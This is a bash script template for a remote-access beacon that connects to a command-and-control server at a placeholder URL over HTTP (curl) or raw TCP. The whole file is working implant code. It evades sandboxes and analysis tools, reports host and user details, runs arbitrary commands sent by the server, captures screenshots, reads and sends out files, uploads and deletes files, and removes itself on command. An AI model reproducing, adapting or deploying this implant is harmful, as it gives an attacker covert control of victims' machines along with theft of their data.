#!/bin/bash

C2_URL="{{C2_URL}}"
# The payload is intentionally not assigned a build-time ID. A single script
# may be launched on multiple hosts, so each process must identify itself.
generate_beacon_id() {
    local id=""
    if [ -r /proc/sys/kernel/random/uuid ]; then
        id=$(cat /proc/sys/kernel/random/uuid 2>/dev/null)
    elif command -v uuidgen >/dev/null 2>&1; then
        id=$(uuidgen 2>/dev/null)
    fi
    if [ -z "$id" ]; then
        local host
        host=$(hostname 2>/dev/null | tr -cd '[:alnum:]_.-')
        [ -z "$host" ] && host="unknown"
        id="$(date +%s%N 2>/dev/null)-$$-${RANDOM:-0}-$host"
    fi
    printf '%s' "$id"
}
BEACON_ID="$(generate_beacon_id)"
BEACON_KEY="{{BEACON_KEY}}"
SLEEP={{SLEEP}}
JITTER={{JITTER}}
PROTO="{{PROTO}}"
ALLOWED_IPS="{{ALLOWED_IPS}}"
BLOCKED_IPS="{{BLOCKED_IPS}}"

# Sandbox detection
check_sandbox() {
    local hn=$(hostname 2>/dev/null | tr '[:lower:]' '[:upper:]')
    local un=$(whoami 2>/dev/null | tr '[:upper:]' '[:lower:]')

    # Exact hostname match only
    for pat in SANDBOX CUCKOO TEQUILA REMNUX FLAREVM TPMNOTIFY; do
        [ "$hn" = "$pat" ] && return 0
    done
    for pat in sandbox cuckoo remnux malnetvm maltest; do
        [ "$un" = "$pat" ] && return 0
    done

    # CPU cores < 2 (2H minimum)
    local cpus=$(nproc 2>/dev/null || echo 2)
    [ "$cpus" -lt 2 ] 2>/dev/null && return 0

    # RAM < 2GB (2G minimum)
    if [ -f /proc/meminfo ]; then
        local mem_kb=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
        [ -n "$mem_kb" ] && [ "$mem_kb" -lt 2097152 ] 2>/dev/null && return 0
    fi

    # Uptime < 30 minutes
    if [ -f /proc/uptime ]; then
        local uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
        [ -n "$uptime_sec" ] && [ "$uptime_sec" -lt 1800 ] 2>/dev/null && return 0
    fi

    # Analysis tools in process list (no VM tools)
    local procs=$(ps aux 2>/dev/null | tr '[:upper:]' '[:lower:]')
    for tool in wireshark tcpdump strace ltrace gdb sysdig cuckoomon dumpcap fakenet; do
        echo "$procs" | grep -q "$tool" && return 0
    done

    return 1
}

check_ip_filter() {
    [ -z "$ALLOWED_IPS" ] && [ -z "$BLOCKED_IPS" ] && return 0
    # Local interface addresses only; no third-party IP echo service.
    local public_ip
    public_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    [ -z "$public_ip" ] && public_ip=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1)
    [ -z "$public_ip" ] && return 0  # fail-open
    if [ -n "$BLOCKED_IPS" ]; then
        IFS='|' read -ra entries <<< "$BLOCKED_IPS"
        for entry in "${entries[@]}"; do
            entry=$(echo "$entry" | xargs)
            [ -z "$entry" ] && continue
            [ "$public_ip" = "$entry" ] && return 1
        done
    fi
    if [ -n "$ALLOWED_IPS" ]; then
        IFS='|' read -ra entries <<< "$ALLOWED_IPS"
        for entry in "${entries[@]}"; do
            entry=$(echo "$entry" | xargs)
            [ -z "$entry" ] && continue
            [ "$public_ip" = "$entry" ] && return 0
        done
        return 1
    fi
    return 0
}

sleep 10
check_sandbox && exit 0
check_ip_filter || exit 0

get_internal_ip() {
    ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | head -1 | awk '{print $2}' | cut -d/ -f1 2>/dev/null || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "unknown"
}

check_admin() {
    [ "$(id -u)" -eq 0 ] && echo "true" || echo "false"
}

json_escape() {
    # stdin-less invocation avoids the trailing-newline artifact of herestrings.
    local out
    out=$(printf '%s' "$1" | python3 -c "import sys,json; sys.stdout.write(json.dumps(sys.stdin.read()))" 2>/dev/null)
    if [ -n "$out" ]; then
        printf '%s' "$out"
        return
    fi
    # Pure-shell fallback: strip control chars, escape backslash/quote, join
    # lines with \n so the result stays valid JSON.
    out=$(printf '%s' "$1" | tr -d '\000-\010\013\014\016-\037\177' | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | awk 'BEGIN{ORS=""} {if (NR>1) printf "\\n"; printf "%s", $0}')
    printf '"%s"' "$out"
}

# HMAC-SHA256 request signing (openssl; python3 fallback). $1 = signing input.
hmac_sign() {
    local sig
    sig=$(printf '%s' "$2" | openssl dgst -sha256 -hmac "$1" 2>/dev/null | awk '{print $NF}' | tr -d '\r\n')
    if [ -z "$sig" ]; then
        sig=$(printf '%s' "$2" | python3 -c 'import sys,hashlib,hmac; print(hmac.new(sys.argv[1].encode(), sys.stdin.buffer.read(), hashlib.sha256).hexdigest())' "$1" 2>/dev/null)
    fi
    printf '%s' "$sig"
}

# Computes signature globals AUTH_TS / AUTH_NONCE / AUTH_SIG for the given
# body. $1 = body.
auth_sign_body() {
    AUTH_TS=$(date +%s)
    AUTH_NONCE=$(openssl rand -hex 8 2>/dev/null)
    if [ -z "$AUTH_NONCE" ]; then
        AUTH_NONCE=$(head -c8 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d ' \n')
    fi
    [ -z "$AUTH_NONCE" ] && AUTH_NONCE="$(date +%s%N)-$RANDOM-$$"
    AUTH_SIG=$(hmac_sign "$BEACON_KEY" "${AUTH_TS}.${AUTH_NONCE}.${1}")
}

get_host_json() {
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    local username=$(whoami 2>/dev/null || echo "unknown")
    local os_info="$(uname -s) $(uname -m)"
    local arch="amd64"
    [ "$(uname -m)" = "i686" ] || [ "$(uname -m)" = "i386" ] && arch="386"
    local pid=$$
    local process_name=$(basename "$0")
    local is_admin=$(check_admin)
    local internal_ip=$(get_internal_ip)

    echo "{\"beacon_id\":\"${BEACON_ID}\",\"hostname\":\"${hostname}\",\"username\":\"${username}\",\"domain\":\"\",\"os\":\"${os_info}\",\"arch\":\"${arch}\",\"pid\":${pid},\"process_name\":\"${process_name}\",\"is_admin\":${is_admin},\"internal_ip\":\"${internal_ip}\",\"sleep\":${SLEEP},\"jitter\":${JITTER}}"
}

sleep_with_jitter() {
    local jitter_range=$((SLEEP * JITTER / 100))
    if [ "$jitter_range" -gt 0 ]; then
        local offset=$((RANDOM % (jitter_range * 2) - jitter_range))
        local actual_sleep=$((SLEEP + offset))
    else
        local actual_sleep=$SLEEP
    fi
    [ "$actual_sleep" -lt 1 ] && actual_sleep=1
    sleep "$actual_sleep"
}

capture_screenshot_sh() {
    local tmp="/tmp/.prts_ss_$$.png"
    local captured=0

    for tool in "import -window root $tmp" "scrot $tmp" "gnome-screenshot -f $tmp" "maim $tmp"; do
        local bin=$(echo "$tool" | awk '{print $1}')
        if command -v "$bin" >/dev/null 2>&1; then
            eval "$tool" >/dev/null 2>&1
            if [ -f "$tmp" ] && [ -s "$tmp" ]; then
                captured=1
                break
            fi
        fi
    done

    if [ "$captured" -eq 1 ]; then
        local b64=$(base64 -w0 "$tmp" 2>/dev/null || base64 "$tmp" 2>/dev/null)
        rm -f "$tmp"
        echo "SCREENSHOT:${b64}"
    else
        rm -f "$tmp" 2>/dev/null
        echo "Error: no screenshot tool available"
    fi
}

process_tasks() {
    local response="$1"
    local task_lines
    task_lines=$(python3 -c "
import sys, json
try:
    tasks = json.loads(sys.stdin.read())
    if isinstance(tasks, list):
        for t in tasks:
            tid = t.get('id','')
            cmd = t.get('command','')
            print(tid + '|||' + cmd)
except:
    pass
" <<< "$response" 2>/dev/null)

    [ -z "$task_lines" ] && return

    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local task_id="${line%%|||*}"
        local cmd="${line#*|||}"

        if [ "$cmd" = "__UNINSTALL__" ]; then
            $SEND_RESULT_FN "$task_id" "UNINSTALLED"
            # Script stagers carry no persistence; remove the script itself (best effort) and exit.
            rm -f "$0" 2>/dev/null
            exit 0
        fi

        if [ "$cmd" = "__EXIT__" ]; then
            $SEND_RESULT_FN "$task_id" "BEACON_TERMINATED"
            exit 0
        fi

        local cmd_lower
        cmd_lower=$(echo "$cmd" | tr '[:upper:]' '[:lower:]')

        local output
        if [ "$cmd_lower" = "pwd" ] || [ "$cmd_lower" = "cwd" ]; then
            output=$(pwd)
        elif echo "$cmd_lower" | grep -q "^cd "; then
            local target="${cmd#cd }"
            target="${target# }"
            if cd "$target" 2>/dev/null; then
                output="Changed directory to: $(pwd)"
            else
                output="Error: cannot cd to $target"
            fi
        elif [ "$cmd" = "__SCREENSHOT__" ]; then
            output=$(capture_screenshot_sh)
        elif echo "$cmd" | grep -q "^__FILELIST__ \|^__FILEREAD__ \|^__FILEUPLOAD__ \|^__MKDIR__ \|^__DELETE__ "; then
            output=$(python3 -c "
import os, json, sys, base64, shutil, time
cmd = sys.argv[1]
if cmd.startswith('__FILELIST__ '):
    d = cmd[13:].strip() or '.'
    if d == '__DRIVES__':
        d = '/'
    try:
        ap = os.path.abspath(d)
        items = []
        for n in os.listdir(ap):
            fp = os.path.join(ap, n)
            try:
                st = os.stat(fp)
                items.append({'name':n,'is_dir':os.path.isdir(fp),'size':st.st_size,'mod_time':time.strftime('%Y-%m-%dT%H:%M:%S',time.localtime(st.st_mtime))})
            except: pass
        print(json.dumps({'path':ap,'items':items}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
elif cmd.startswith('__FILEREAD__ '):
    fp = cmd[13:].strip()
    try:
        ap = os.path.abspath(fp)
        sz = os.path.getsize(ap)
        if sz > 50*1024*1024:
            print(json.dumps({'error':'file too large (>50MB)'}))
        else:
            with open(ap,'rb') as f: data=f.read()
            print(json.dumps({'path':ap,'size':sz,'base64':base64.b64encode(data).decode()}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
elif cmd.startswith('__FILEUPLOAD__ '):
    rest = cmd[15:].strip()
    idx = rest.find(' ')
    if idx < 0:
        print(json.dumps({'error':'usage error'}))
    else:
        fp, b64 = rest[:idx], rest[idx+1:]
        try:
            ap = os.path.abspath(fp)
            os.makedirs(os.path.dirname(ap), exist_ok=True)
            data = base64.b64decode(b64)
            with open(ap,'wb') as f: f.write(data)
            print(json.dumps({'status':'ok','path':ap,'size':len(data)}))
        except Exception as e:
            print(json.dumps({'error':str(e)}))
elif cmd.startswith('__MKDIR__ '):
    dp = cmd[10:].strip()
    try:
        ap = os.path.abspath(dp)
        os.makedirs(ap, exist_ok=True)
        print(json.dumps({'status':'ok','path':ap}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
elif cmd.startswith('__DELETE__ '):
    tp = cmd[10:].strip()
    try:
        ap = os.path.abspath(tp)
        if os.path.isdir(ap): shutil.rmtree(ap)
        else: os.remove(ap)
        print(json.dumps({'status':'ok','path':ap}))
    except Exception as e:
        print(json.dumps({'error':str(e)}))
" "$cmd" 2>&1)
        else
            output=$(eval "$cmd" 2>&1)
        fi

        $SEND_RESULT_FN "$task_id" "$output"
    done <<< "$task_lines"
}

# ==================== HTTP MODE ====================

http_register() {
    local json=$(get_host_json)
    local resp
    auth_sign_body "$json"
    resp=$(curl -s -X POST "${C2_URL}/checkin" \
        -H "Content-Type: application/json" \
        -H "X-Beacon-ID: ${BEACON_ID}" \
        -H "X-Beacon-Timestamp: ${AUTH_TS}" \
        -H "X-Beacon-Nonce: ${AUTH_NONCE}" \
        -H "X-Beacon-Sign: ${AUTH_SIG}" \
        -d "${json}" -m 10 2>/dev/null)
    [ "$resp" = "__TERMINATE__" ] && exit 0
}

http_send_result() {
    local task_id="$1"
    local output="$2"
    local escaped_output
    escaped_output=$(json_escape "$output")
    local json="{\"task_id\":\"${task_id}\",\"output\":${escaped_output},\"beacon_id\":\"${BEACON_ID}\"}"
    auth_sign_body "$json"
    curl -s -X POST "${C2_URL}/checkin" \
        -H "Content-Type: application/json" \
        -H "X-Beacon-ID: ${BEACON_ID}" \
        -H "X-Beacon-Timestamp: ${AUTH_TS}" \
        -H "X-Beacon-Nonce: ${AUTH_NONCE}" \
        -H "X-Beacon-Sign: ${AUTH_SIG}" \
        -d "${json}" -m 10 >/dev/null 2>&1
}

http_checkin() {
    local response
    local poll='{"type":"poll"}'
    auth_sign_body "$poll"
    response=$(curl -s -X POST "${C2_URL}/checkin" \
        -H "Content-Type: application/json" \
        -H "X-Beacon-ID: ${BEACON_ID}" \
        -H "X-Beacon-OS: $(uname -s) $(uname -m)" \
        -H "X-Beacon-Timestamp: ${AUTH_TS}" \
        -H "X-Beacon-Nonce: ${AUTH_NONCE}" \
        -H "X-Beacon-Sign: ${AUTH_SIG}" \
        -d "${poll}" -m 10 2>/dev/null)

    [ -z "$response" ] && return
    [ "$response" = "__TERMINATE__" ] && exit 0

    if echo "$response" | grep -q "^SLEEP "; then
        SLEEP=$(echo "$response" | awk '{print $2}')
        JITTER=$(echo "$response" | awk '{print $3}')
        return
    fi

    process_tasks "$response"
}

run_http() {
    SEND_RESULT_FN="http_send_result"
    http_register
    while true; do
        sleep_with_jitter
        http_checkin
    done
}

# ==================== TCP MODE ====================

# TCP mode uses python3 as a helper for socket framing
run_tcp() {
    SEND_RESULT_FN="tcp_send_result_stub"
    PRTS_SCRIPT_PATH="$0" python3 -c "
import socket, struct, json, subprocess, os, sys, time, random, platform, hashlib, hmac as hmac_mod

C2_URL = '''${C2_URL}'''
BEACON_ID = '''${BEACON_ID}'''
BEACON_KEY = '''${BEACON_KEY}'''
SLEEP = ${SLEEP}
JITTER = ${JITTER}

def get_host_info():
    # Parsed with json.loads: raw injection would break on JSON booleans
    # (false/true are not valid Python literals).
    return json.loads('''$(get_host_json)''')

def tcp_sign(msg_type, data_bytes):
    ts = int(time.time())
    nonce = os.urandom(8).hex()
    mac = hmac_mod.new(BEACON_KEY.encode(), msg_type.encode() + b'.' + str(ts).encode() + b'.' + nonce.encode() + b'.' + data_bytes, hashlib.sha256)
    return ts, nonce, mac.hexdigest()

def tcp_write(sock, msg):
    if BEACON_KEY and 'sig' not in msg and 'type' in msg:
        data_bytes = json.dumps(msg.get('data', '')).encode() if msg.get('data') is not None else b''
        ts, nonce, sig = tcp_sign(msg['type'], data_bytes)
        msg = dict(msg)
        msg['ts'] = ts
        msg['nonce'] = nonce
        msg['sig'] = sig
    data = json.dumps(msg).encode()
    sock.sendall(struct.pack('>I', len(data)) + data)

def tcp_read(sock):
    hdr = b''
    while len(hdr) < 4:
        c = sock.recv(4 - len(hdr))
        if not c: raise ConnectionError()
        hdr += c
    ln = struct.unpack('>I', hdr)[0]
    data = b''
    while len(data) < ln:
        c = sock.recv(min(ln - len(data), 65536))
        if not c: raise ConnectionError()
        data += c
    return json.loads(data)

def execute(cmd):
    cl = cmd.strip().lower()
    if cl in ('pwd','cwd'): return os.getcwd()
    if cl.startswith('cd '):
        try: os.chdir(cmd[3:].strip()); return 'Changed to: ' + os.getcwd()
        except Exception as e: return str(e)
    try:
        r = subprocess.run(['/bin/sh','-c',cmd], capture_output=True, text=True, timeout=120)
        return r.stdout + (('\\n'+r.stderr) if r.stderr else '')
    except Exception as e:
        return 'Error: ' + str(e)

def sleep_j():
    jr = SLEEP * (JITTER / 100.0)
    time.sleep(max(0.5, SLEEP + random.uniform(-jr, jr)))

def parse_target(url):
    url = url.strip()
    if ']:' in url:
        host, port = url.rsplit(']:', 1)
        return host.lstrip('[').rstrip(']'), int(port) if port.isdigit() else 4444
    parts = url.rsplit(':', 1)
    if len(parts) == 2 and parts[1].isdigit() and parts[0].count(':') <= 1:
        return parts[0], int(parts[1])
    return url, 4444

host, port = parse_target(C2_URL)

while True:
    s = None
    try:
        s = socket.create_connection((host, port), timeout=10)
        tcp_write(s, {'type':'register','data':get_host_info()})
        ack = tcp_read(s)
        if ack.get('type') == 'terminate': s.close(); sys.exit(0)
        while True:
            sleep_j()
            tcp_write(s, {'type':'checkin'})
            resp = tcp_read(s)
            if resp.get('type') == 'terminate':
                s.close(); sys.exit(0)
            elif resp.get('type') == 'tasks':
                for t in resp.get('data', []):
                    if t.get('command') == '__UNINSTALL__':
                        tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'UNINSTALLED','beacon_id':BEACON_ID}})
                        tcp_read(s)
                        import os as _os
                        try:
                            sp = _os.environ.get('PRTS_SCRIPT_PATH','')
                            if sp: _os.remove(sp)
                        except Exception: pass
                        s.close(); sys.exit(0)
                    if t.get('command') == '__EXIT__':
                        tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'TERMINATED','beacon_id':BEACON_ID}})
                        tcp_read(s); s.close(); sys.exit(0)
                    out = execute(t.get('command',''))
                    tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':out,'beacon_id':BEACON_ID}})
                    tcp_read(s)
            elif resp.get('type') == 'sleep':
                c = resp.get('data',{})
                if c.get('sleep',0) > 0: SLEEP = c['sleep']
                if c.get('jitter',-1) >= 0: JITTER = c['jitter']
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception:
        pass
    finally:
        if s is not None:
            try: s.close()
            except Exception: pass
    sleep_j()
" 2>/dev/null
}

# ==================== MAIN ====================

if [ "$PROTO" = "tcp" ]; then
    run_tcp
else
    run_http
fi
